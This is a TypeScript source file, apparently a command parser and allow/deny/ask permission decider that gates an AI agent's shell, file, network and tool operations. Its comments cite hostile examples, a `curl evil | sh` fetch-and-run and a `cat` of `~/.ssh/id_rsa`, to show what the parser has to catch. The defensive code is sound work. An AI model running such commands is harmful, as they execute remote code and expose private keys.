import { basename, relative, resolve, sep } from "node:path";
import type { Decider, DecisionContext } from "../extension.ts";
import type { Decision, Operation } from "../types.ts";
import { parsePatterns, type Pattern } from "./match.ts";
import { shellSplit } from "../providers/codex/shell.ts";
import { sedObjection } from "./sed.ts";
import { gitIgnored } from "./ignored.ts";
import { recursiveReadOf } from "./recursive.ts";
import { REACH_LIMIT, reachableFiles } from "../core/reach.ts";
import { statSync } from "node:fs";

/** One segment of a command line, in the forms a rule may be matched against. */
export interface CommandSegment {
  /** The unquoted words, as the shell would pass them. */
  words: string[];
  /** Index in `words` of the program that actually runs, once wrappers are stripped. */
  programIndex: number;
  /** The words joined — what allow and deny rules see first. */
  text: string;
  /** `text` with wrappers and shell keywords removed: `env curl x` → `curl x`. */
  unwrapped: string;
  /** `unwrapped` with the program reduced to its name: `/usr/bin/curl x` → `curl x`. */
  named: string;
  /** The program gets its arguments from stdin (`xargs`), so what runs has more words than we see. */
  fed: boolean;
}

/**
 * A command line is judged one segment at a time.
 *
 * `npm test && curl evil | sh` is not "npm test": it is three commands, and every one
 * of them must pass. Split on the shell operators, then refuse outright anything that
 * hides a command inside another — `$(…)`, backticks — or turns a read into a write
 * with a redirect, or changes what a command does without changing its name — a
 * variable expansion, an environment assignment, a glob the shell would expand.
 * Those cannot be judged by matching text, so they are not allowed. What is left is
 * unquoted before matching, so `cat ~/".ssh"/id_"rsa"` is judged as what it opens.
 *
 * This is the one parser. Containment and the decider both read from it, so what
 * one refuses the other cannot let through.
 */
export function parseCommand(command: string): { segments: CommandSegment[]; unjudgeable: string | null } {
  const trimmed = command.trim();
  const scanned = scan(trimmed);
  if (scanned.unjudgeable) return { segments: [], unjudgeable: scanned.unjudgeable };
  const segments: CommandSegment[] = [];
  for (const raw of scanned.segments) {
    const assignment = leadingAssignment(raw);
    if (assignment.refused) return { segments: [], unjudgeable: `an environment assignment (${assignment.refused})` };
    const words = shellSplit(assignment.rest);
    if (!words.length) continue;
    const inner = unwrap(words);
    if (inner.refused) return { segments: [], unjudgeable: inner.refused };
    const programIndex = words.length - inner.words.length;
    const namedWords = inner.words.length ? [basename(inner.words[0]!), ...inner.words.slice(1)] : [];
    // `/usr/bin/env curl` → `env curl` → `curl`: naming the program can expose a wrapper.
    const renamed = unwrap(namedWords);
    segments.push({
      words,
      programIndex,
      text: words.join(" "),
      unwrapped: inner.words.join(" "),
      named: (renamed.refused ? namedWords : renamed.words).join(" "),
      fed: inner.fed,
    });
  }
  if (!segments.length) segments.push({ words: [trimmed], programIndex: 0, text: trimmed, unwrapped: trimmed, named: trimmed, fed: false });
  return { segments, unjudgeable: null };
}

/** Shell keywords that may precede a command inside a compound. */
const KEYWORDS = new Set(["if", "then", "else", "elif", "while", "until", "do", "!", "{", "}"]);
/** Wrappers that run their argument unchanged and take no options we can judge. */
const PLAIN_WRAPPERS = new Set(["exec", "builtin", "nohup", "time", "setsid", "unbuffer"]);
const XARGS_WITH_VALUE = new Set([
  "-n", "-I", "-P", "-L", "-s", "-d", "-E", "-a", "-J", "-R", "-S",
  "--max-args", "--replace", "--max-procs", "--max-lines", "--delimiter", "--arg-file", "--max-chars", "--eof",
]);

/**
 * Strip the wrappers a shell puts in front of the command that actually runs, so a
 * deny rule for `curl` also sees `env curl`, `nohup curl`, `xargs curl`. Options that
 * would change what runs (`env -S`, `nohup -p`) are refused: a rule cannot judge them.
 */
function unwrap(input: readonly string[]): { words: string[]; refused: string | null; fed: boolean } {
  let words = [...input];
  let fed = false;
  for (let guard = 0; guard < 8 && words.length; guard++) {
    const head = words[0]!;
    if (KEYWORDS.has(head)) {
      words.shift();
      continue;
    }
    if (head === "env") {
      words.shift();
      if (words[0]?.startsWith("-")) return { words, refused: "options to env", fed };
      while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0] ?? "")) {
        const name = words[0]!.slice(0, words[0]!.indexOf("="));
        if (!HARMLESS_ASSIGNMENT.test(name)) return { words, refused: `an environment assignment (${name})`, fed };
        words.shift();
      }
      continue;
    }
    if (head === "command") {
      // `command -v x` asks where x lives; it runs nothing.
      if (words[1] === "-v" || words[1] === "-V") break;
      words.shift();
      if (words[0] === "-p") words.shift();
      continue;
    }
    if (PLAIN_WRAPPERS.has(head)) {
      words.shift();
      if (words[0]?.startsWith("-")) return { words, refused: `options to ${head}`, fed };
      continue;
    }
    if (head === "nice") {
      words.shift();
      if (words[0] === "-n") words.splice(0, 2);
      else if (/^-\d+$|^--adjustment=/.test(words[0] ?? "")) words.shift();
      continue;
    }
    if (head === "timeout") {
      words.shift();
      while (words[0]?.startsWith("-")) {
        if (words[0] === "-k" || words[0] === "-s") words.splice(0, 2);
        else words.shift();
      }
      words.shift(); // the duration
      continue;
    }
    if (head === "stdbuf") {
      words.shift();
      while (words[0]?.startsWith("-")) words.shift();
      continue;
    }
    if (head === "xargs") {
      words.shift();
      fed = true;
      while (words[0]?.startsWith("-")) {
        const flag = words.shift()!;
        if (XARGS_WITH_VALUE.has(flag)) words.shift();
      }
      continue;
    }
    break;
  }
  return { words, refused: null, fed };
}

/**
 * One pass over the line with the shell's quoting rules: inside single quotes
 * everything is literal; inside double quotes `$` and backticks still expand; outside
 * quotes operators split segments and globs expand. Whatever the shell would
 * interpret and the rule cannot see is reported, and the first reason wins.
 */
function scan(line: string): { segments: string[]; unjudgeable: string | null } {
  const segments: string[] = [];
  let current = "";
  let quote: "'" | '"' | null = null;
  const push = () => {
    if (current.trim()) segments.push(current.trim());
    current = "";
  };
  // A `$` that expands: anything but a bare `$` before whitespace, the end, or a closing quote.
  const expands = (next: string, closing: string) => next !== "" && next !== closing && !/\s/.test(next);
  for (let index = 0; index < line.length; index++) {
    const char = line[index]!;
    const next = line[index + 1] ?? "";
    if (quote === "'") {
      if (char === "'") quote = null;
      current += char;
      continue;
    }
    if (quote === '"') {
      if (char === "\\" && next === "\n") {
        index++; // line continuation
        continue;
      }
      if (char === "\\") {
        current += char + next;
        index++;
        continue;
      }
      if (char === "`" || (char === "$" && next === "(")) return { segments, unjudgeable: "command substitution" };
      if (char === "$" && expands(next, '"')) return { segments, unjudgeable: "variable expansion" };
      if (char === '"') quote = null;
      current += char;
      continue;
    }
    // outside quotes
    const wordStart = current === "" || /[\s=]$/.test(current);
    if (char === "\\" && next === "\n") {
      index++; // line continuation
      continue;
    }
    if (char === "\\") {
      current += char + next;
      index++;
      continue;
    }
    if (char === "'" || char === '"') {
      quote = char;
      current += char;
      continue;
    }
    if (char === "`" || (char === "$" && next === "(") || (char === "<" && next === "(")) return { segments, unjudgeable: "command substitution" };
    if (char === "(" || char === ")") {
      // A subshell runs what is inside it; judge that as its own segment.
      push();
      continue;
    }
    if (char === "$" && expands(next, "")) return { segments, unjudgeable: "variable expansion" };
    if (char === "~" && wordStart && next !== "" && next !== "/" && !/\s/.test(next)) return { segments, unjudgeable: "tilde expansion" };
    if (char === "{") {
      // `{a,b}` and `{1..3}` expand to several words; a bare `{}` (find -exec) does not.
      const close = line.indexOf("}", index);
      const inside = close === -1 ? "" : line.slice(index + 1, close);
      if (inside.includes(",") || inside.includes("..")) return { segments, unjudgeable: "brace expansion" };
    }
    if (char === ">") {
      // `2>/dev/null` and `2>&1` discard or merge output; they cannot write a file.
      const harmless = /^(?:>\s*\/dev\/null|>&[0-9])(?=$|[\s;&|])/.exec(line.slice(index));
      if (!harmless) return { segments, unjudgeable: "output redirect" };
      current = current.replace(/(^|\s)[0-9]$/, "$1"); // the fd number belongs to the redirect
      index += harmless[0].length - 1;
      continue;
    }
    if (char === "*" || char === "?" || char === "[") return { segments, unjudgeable: `a shell glob (${char})` };
    if (char === "\n" || char === "\r" || char === ";") {
      push();
      if (char === ";" && next === ";") index++;
      continue;
    }
    if (char === "|") {
      push();
      if (next === "|" || next === "&") index++;
      continue;
    }
    if (char === "&") {
      if (next === ">") return { segments, unjudgeable: "output redirect" };
      if (/^&[0-9]/.test(line.slice(index))) return { segments, unjudgeable: "output redirect" }; // a stray >&2 form
      push();
      if (next === "&") index++;
      continue;
    }
    current += char;
  }
  if (quote) return { segments, unjudgeable: "unbalanced quotes" };
  push();
  return { segments, unjudgeable: null };
}

/**
 * `CI=1 npm test` is still `npm test`; `NODE_OPTIONS=--require=x tsc` is not.
 * Only assignments that cannot change what a command does are stripped; any other
 * leading assignment refuses the segment.
 */
const HARMLESS_ASSIGNMENT = /^(?:CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|LANG|LC_ALL|DEBUG|TERM|COLUMNS)$/;
function leadingAssignment(segment: string): { rest: string; refused: string | null } {
  let rest = segment;
  for (;;) {
    const match = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)\s+/.exec(rest);
    if (!match) return { rest, refused: null };
    if (!HARMLESS_ASSIGNMENT.test(match[1]!)) return { rest, refused: match[1]! };
    rest = rest.slice(match[0].length);
  }
}

/** The values a rule is matched against, per operation kind. */
function isDirectory(path: string): boolean {
  try {
    return statSync(path).isDirectory();
  } catch {
    return false;
  }
}

/** A path as the rules see it: relative to the workspace, forward slashes. */
function relativise(workspaceRoot: string, path: string): string {
  const full = resolve(workspaceRoot, path);
  const inside = relative(workspaceRoot, full);
  // Paths outside the workspace are rejected before we get here, but be explicit.
  return inside === "" ? "." : inside.split(sep).join("/");
}

/**
 * One thing a rule is matched against, in every form that means the same thing.
 * Deny rules match any form: `env curl x`, `curl x` and `/usr/bin/curl x` are all
 * `curl x` to a deny. Allow rules match only the line as written or with wrappers
 * removed — never the bare program name, so `./bin/git status` is not `git status`.
 */
interface Subject {
  deny: string[];
  allow: string[];
}

const plain = (value: string): Subject => ({ deny: [value], allow: [value] });

function subjects(operation: Operation, workspaceRoot: string): Subject[] {
  switch (operation.kind) {
    case "read":
      return operation.paths.map((path) => plain(relativise(workspaceRoot, path)));
    case "write":
      return operation.changes.map((change) => plain(relativise(workspaceRoot, change.path)));
    case "exec":
      return parseCommand(operation.command).segments.map((segment) => ({
        // A program fed by xargs runs with words we cannot see; `curl *` must still see it.
        deny: [...new Set([segment.text, segment.unwrapped, segment.named, ...(segment.fed ? [`${segment.unwrapped} <stdin>`, `${segment.named} <stdin>`] : [])])],
        allow: [...new Set([segment.text, segment.unwrapped])],
      }));
    case "net":
      return [plain(operation.host ?? operation.url ?? "*")];
    case "tool":
      return [plain(`${operation.server}/${operation.tool}`)];
  }
}

function firstMatch(
  patterns: readonly Pattern[],
  kind: string,
  values: readonly string[],
): Pattern | undefined {
  return patterns.find(
    (pattern) => pattern.kind === kind && values.some((value) => pattern.test(value)),
  );
}

function firstDenied(patterns: readonly Pattern[], kind: string, subjects: readonly Subject[]): Pattern | undefined {
  return firstMatch(patterns, kind, subjects.flatMap((subject) => subject.deny));
}

function firstAllowed(patterns: readonly Pattern[], kind: string, subjects: readonly Subject[]): Pattern | undefined {
  return firstMatch(patterns, kind, subjects.flatMap((subject) => subject.allow));
}

function everySubjectMatches(
  patterns: readonly Pattern[],
  kind: string,
  subjects: readonly Subject[],
): boolean {
  return subjects.every((subject) =>
    subject.allow.some((value) => patterns.some((pattern) => pattern.kind === kind && pattern.test(value))),
  );
}

/**
 * The free decider: three flat lists. Deny wins, allow passes, ask parks the run
 * until someone at this machine answers — once, for this operation only — and
 * anything unmatched is refused.
 *
 * An unanswered ask is refused when `approvals.timeoutMinutes` runs out, so a
 * headless run can stall but never hangs and never gets a silent yes.
 */
export class BuiltinDecider implements Decider {
  readonly name = "builtin-allow-deny";
  private readonly allow: Pattern[];
  private readonly deny: Pattern[];
  private readonly ask: Pattern[];

  private readonly reachLimit: number;

  constructor(
    lists: { allow: readonly string[]; deny: readonly string[]; ask?: readonly string[] },
    options: { reachLimit?: number } = {},
  ) {
    this.allow = parsePatterns(lists.allow);
    this.deny = parsePatterns(lists.deny);
    this.ask = parsePatterns(lists.ask ?? []);
    this.reachLimit = options.reachLimit ?? REACH_LIMIT;
  }

  /**
   * A search over a directory is judged by every file it can reach. A reached file the
   * deny list names refuses the search — unless the tool honours .gitignore and git
   * says the file is ignored, because then the tool never opens it. Everything reached
   * joins the subjects, so the allow list must cover it too.
   */
  private async reach(
    dirs: readonly string[],
    search: { hidden: boolean; follow: boolean; respectsIgnore: boolean },
    root: string,
  ): Promise<{ refused: Decision | null; reached: Array<{ where: string; subjects: Subject[] }> }> {
    const reached: Array<{ where: string; subjects: Subject[] }> = [];
    for (const dir of dirs) {
      if (!isDirectory(dir)) continue;
      const reach = reachableFiles(dir, root, { hidden: search.hidden, follow: search.follow, limit: this.reachLimit });
      const where = relativise(root, dir);
      const refuse = (reason: string, rule?: string): { refused: Decision; reached: [] } => ({ refused: { verdict: "deny", reason, ...(rule ? { rule } : {}) }, reached: [] });
      if (reach.truncated)
        return refuse(`Refused: a search over ${where} reaches too many files to judge (more than ${this.reachLimit}). Search a narrower path.`);
      if (reach.outside)
        return refuse(`Refused: a search over ${where} would follow ${relativise(root, reach.outside)} out of the workspace.`);
      const named = reach.files.map((file) => [file, relativise(root, file)] as const);
      const denied = named.filter(([, relativePath]) => firstMatch(this.deny, "read", [relativePath]));
      const ignored = denied.length && search.respectsIgnore ? await gitIgnored(root, denied.map(([file]) => file)) : new Set<string>();
      const first = denied.find(([file]) => !ignored.has(file));
      if (first) {
        const rule = firstMatch(this.deny, "read", [first[1]])!;
        return refuse(`Refused by the deny list (${rule.source}): a search over ${where} reaches ${first[1]}. Search a narrower path.`, rule.source);
      }
      reached.push({ where, subjects: named.filter(([file]) => !ignored.has(file)).map(([, relativePath]) => plain(relativePath)) });
    }
    return { refused: null, reached };
  }

  async decide(
    operation: Operation,
    context: DecisionContext,
  ): Promise<Decision> {
    if (operation.kind === "exec") {
      const { unjudgeable } = parseCommand(operation.command);
      if (unjudgeable)
        return {
          verdict: "deny",
          reason: `Refused: the command uses ${unjudgeable}, which cannot be judged by a rule. Run it as separate plain commands.`,
        };
    }

    const values = subjects(operation, context.workspaceRoot);

    // An operation that declares nothing cannot be judged, and [].every() is true.
    if (values.length === 0) {
      if (operation.kind === "read")
        values.push(plain("."));
      else
        return { verdict: "deny", reason: `Refused: a ${operation.kind} operation with nothing declared.` };
    }

    // Claude's Grep runs `rg --hidden`: dotfiles too, symlinks not followed, .gitignore honoured.
    if (operation.kind === "read" && operation.recursive) {
      const { refused, reached } = await this.reach(operation.paths, { hidden: true, follow: false, respectsIgnore: true }, context.workspaceRoot);
      if (refused) return refused;
      // The search reads the files, not the directory entry: the allow list must cover those.
      for (const { where, subjects: files } of reached) {
        if (!files.length) continue;
        const own = values.findIndex((subject) => subject.allow[0] === where);
        if (own >= 0) values.splice(own, 1);
        values.push(...files);
      }
    }

    // `grep -r`, `rg`, `diff -r`: a command that searches a directory reaches what is in it.
    if (operation.kind === "exec")
      for (const segment of parseCommand(operation.command).segments) {
        const search = recursiveReadOf(segment.words.slice(segment.programIndex), operation.cwd);
        if (!search) continue;
        const { refused } = await this.reach(search.dirs, search, context.workspaceRoot);
        if (refused) return refused;
      }

    if (operation.kind === "exec") {
      // A command that names a file is a read of that file, whatever the file is called
      // on the command line: containment resolved the names to what is on disk.
      if (operation.paths?.length) {
        const named = operation.paths.map((path) => relativise(context.workspaceRoot, path));
        const denied = firstMatch(this.deny, "read", named);
        if (denied)
          return {
            verdict: "deny",
            reason: `Refused by the deny list (${denied.source}): the command reads ${named.find((path) => denied.test(path))}.`,
            rule: denied.source,
          };
      }
    }

    // Deny first, and a single denied path — or command segment — refuses the whole operation.
    const denied = firstDenied(this.deny, operation.kind, values);
    if (denied)
      return {
        verdict: "deny",
        reason: `Refused by the deny list (${denied.source}).`,
        rule: denied.source,
      };

    // sed is allowed for reading, so its script must be one that only reads.
    if (operation.kind === "exec")
      for (const segment of parseCommand(operation.command).segments) {
        const program = segment.words.slice(segment.programIndex);
        if (!["sed", "gsed"].includes(basename(program[0] ?? ""))) continue;
        const objection = sedObjection(program);
        if (objection)
          return {
            verdict: "deny",
            reason: `Refused: only sed scripts that print or filter are allowed (${objection}). Use -n or -E with p, d, s/…/…/ and addresses; w, r, e, -i and -f cannot be judged by a rule.`,
          };
      }

    // Every path in a multi-file change, and every segment of a command, must be allowed.
    if (everySubjectMatches(this.allow, operation.kind, values)) {
      const matched = firstAllowed(this.allow, operation.kind, values);
      return {
        verdict: "allow",
        reason: `Allowed by ${matched?.source ?? "the allow list"}.`,
        ...(matched ? { rule: matched.source } : {}),
        scope: "once",
      };
    }

    // Every segment must be covered by allow or ask for the question to be worth asking:
    // a segment nobody would allow makes the whole command a refusal, not a question.
    if (this.ask.length && everySubjectMatches([...this.allow, ...this.ask], operation.kind, values)) {
      const matched = firstAllowed(this.ask, operation.kind, values);
      return {
        verdict: "ask",
        reason: `Matches ${matched?.source ?? "the ask list"}; waiting for an answer at this machine.`,
        ...(matched ? { rule: matched.source } : {}),
      };
    }

    return {
      verdict: "deny",
      reason:
        `No allow rule covers this ${operation.kind} operation. ` +
        `Add a pattern to decide.allow in config.json, or to decide.ask to be asked at the terminal next time.`,
    };
  }
}
